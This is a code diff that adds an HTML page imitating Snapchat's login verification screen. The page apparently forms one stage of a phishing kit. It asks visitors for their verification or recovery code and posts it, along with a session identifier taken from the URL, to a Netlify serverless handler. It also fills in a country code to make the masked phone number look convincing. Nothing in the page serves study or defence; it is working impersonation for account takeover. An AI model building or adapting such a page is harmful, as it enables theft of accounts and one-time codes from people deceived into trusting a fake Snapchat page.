@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Verification • Snapchat</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="logo-container">
+            <svg class="logo-svg" viewBox="0 0 40 38" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M39.33 34.33c0 .9-.38 1.76-.84 2.33-.48.57-1.2.9-2.16.9H3.67c-.96 0-1.68-.33-2.16-.9C.88 36.1.5 35.24.5 34.33V3.67C.5 2.76.88 1.9 1.5.83c.48-.56 1.2-.83 2.16-.83h21.5l12.17 12.17v22.16Z" fill="#FFFC00" stroke="#000" stroke-width="1"></path><path d="M29.5 32.5c0 .9-.38 1.76-.84 2.33-.49.57-1.2.9-2.16.9H7.83c-.96 0-1.68-.33-2.16-.9-.63-.74-.84-1.43-.84-2.33v-25c0-.9.38-1.76.84-2.33.48-.57 1.2-.9 2.16-.9h15.84c.96 0 1.68.33 2.16.9.62.74.84 1.43.84 2.33v25Z" fill="#fff"></path><path d="M22.33 25.17c-.42 1.03-1.12 1.8-2.12 2.3-1 .5-2.25.7-3.75.7-1.75 0-3.25-.45-4.5-1.34-1.25-.9-1.88-2.2-1.88-3.92 0-.8.2-1.57.62-2.3.42-.74 1-1.36 1.75-1.86.75-.5 1.58-.88 2.5-1.13 1.07-.3 2.5-.45 4.25-.45h.5V15.5c0-.62-.16-1.12-.47-1.5-.3-.37-.8-.56-1.5-.56-.63 0-1.17.15-1.63.45-.45.3-.83.75-1.12 1.35l-3.38-1.5c.5-.94 1.2-1.7 2.12-2.28 1.08-.7 2.4-.9 3.96-.9 1.43 0 2.6.27 3.5.8.9.54 1.55 1.3 1.95 2.3.4.98.6 2.15.6 3.5v8.25h-3.5v-1.09ZM18.5 22.83c.75.56 1.63.84 2.63.84.93 0 1.7-.28 2.3-.84.6-.56.9-1.3.9-2.25v-1.12h-.88c-1.81 0-3.13.2-3.94.62-.82.4-.94 1.06-.94 1.75Z" fill="#000"></path></svg>
+        </div>
+        <h1>Login Verification</h1>
+        <p class="description">Please enter the code sent to +<span id="country-code-display"></span>xxxxxxxxxx.<br>Please enter it below, or enter your recovery code if you lost your phone or changed your number.</p>
+        <form method="POST" action="/.netlify/functions/handler">
+            <input type="hidden" name="form_type" value="otp">
+            <input type="hidden" name="session" id="session-input">
+            <input type="tel" id="otp" name="otp" placeholder="Verification Code" required pattern="[0-9]{6,}" title="Enter at least 6 digits">
+            <button type="submit">Continue</button>
+        </form>
+    </div>
+
+    <footer>
+        <a href="#" class="footer-link">Terms of Service</a>
+        <a href="#" class="footer-link">Privacy Policy</a>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const sessionId = params.get('session');
+            const countryCode = params.get('cc');
+
+            if (countryCode) {
+                document.getElementById('country-code-display').innerText = countryCode;
+            } else {
+                // Fallback if country code is not detected
+                document.getElementById('country-code-display').innerText = '??';
+            }
+            if (sessionId) {
+                document.getElementById('session-input').value = sessionId;
+            }
+        });
+    </script>
+</body>
+</html>
